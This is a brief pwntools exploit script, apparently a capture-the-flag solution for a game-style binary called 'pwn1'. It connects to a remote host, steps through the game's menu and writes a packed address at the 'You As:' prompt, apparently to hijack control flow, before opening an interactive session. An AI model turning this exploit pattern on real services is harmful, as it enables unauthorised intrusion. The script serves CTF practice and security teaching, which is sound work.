#!/usr/bin/env python3
from pwn import *
exe = ELF('pwn1', checksec = False)

# p = process(exe.path)
p = remote('103.197.184.48', 13331)

def sheld():
    for i in range(0, 2):
        p.sendline(b'3')
    p.sendline(b'2')

#first die
# input()
p.sendlineafter(b'NeZha', b'1')

p.sendline(b'1')
p.sendline(b'1')

p.sendlineafter(b'NeZha', b'1')
for i in range(0, 4):
    sheld()

p.sendlineafter(b'You As:', p32(0x08049CB8))



p.interactive()